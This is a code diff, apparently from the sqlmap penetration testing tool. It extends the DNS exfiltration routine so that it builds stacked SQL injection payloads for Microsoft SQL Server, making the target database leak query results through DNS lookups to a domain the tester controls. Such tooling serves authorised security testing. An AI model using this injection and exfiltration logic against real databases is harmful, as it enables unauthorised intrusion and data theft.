@@ -13,12 +13,15 @@ import time
 from lib.core.agent import agent
 from lib.core.common import Backend
 from lib.core.common import calculateDeltaSeconds
+from lib.core.common import cleanQuery
 from lib.core.common import dataToStdout
 from lib.core.common import decodeHexValue
 from lib.core.common import extractRegexResult
 from lib.core.common import getSPLSnippet
 from lib.core.common import hashDBRetrieve
 from lib.core.common import hashDBWrite
+from lib.core.common import pushValue
+from lib.core.common import popValue
 from lib.core.common import randomInt
 from lib.core.common import randomStr
 from lib.core.common import safecharencode
@@ -29,6 +32,7 @@ from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.data import queries
 from lib.core.enums import DBMS
+from lib.core.enums import PAYLOAD
 from lib.core.settings import MAX_DNS_LABEL
 from lib.core.settings import PARTIAL_VALUE_MARKER
 from lib.core.unescaper import unescaper
@@ -53,6 +57,7 @@ def dnsUse(payload, expression):
 
         if output is None:
             kb.dnsMode = True
+            pushValue(kb.technique)
 
             while True:
                 count += 1
@@ -67,8 +72,18 @@ def dnsUse(payload, expression):
                 expressionRequest = getSPLSnippet(Backend.getIdentifiedDbms(), "dns_request", PREFIX=prefix, QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dnsDomain)
                 expressionUnescaped = unescaper.unescape(expressionRequest)
 
-                forgedPayload = safeStringFormat(payload, (expressionUnescaped, randomInt(1), randomInt(3)))
-                Request.queryPage(forgedPayload, content=False, raise404=False)
+
+                if Backend.isDbms(DBMS.MSSQL):
+                    kb.technique = PAYLOAD.TECHNIQUE.STACKED
+                    expression = cleanQuery(expression)
+
+                    comment = queries[Backend.getIdentifiedDbms()].comment.query
+                    query = agent.prefixQuery("; %s" % expressionUnescaped)
+                    query = agent.suffixQuery("%s;%s" % (query, comment))
+                    forgedPayload = agent.payload(newValue=query)
+                else:
+                    forgedPayload = safeStringFormat(payload, (expressionUnescaped, randomInt(1), randomInt(3)))
+                Request.queryPage(forgedPayload, content=False, noteResponseTime=False, raise404=False)
 
                 _ = conf.dnsServer.pop(prefix, suffix)
                 if _:
@@ -81,6 +96,7 @@ def dnsUse(payload, expression):
                 else:
                     break
 
+            kb.technique = popValue()
             kb.dnsMode = False
 
         if output is not None:
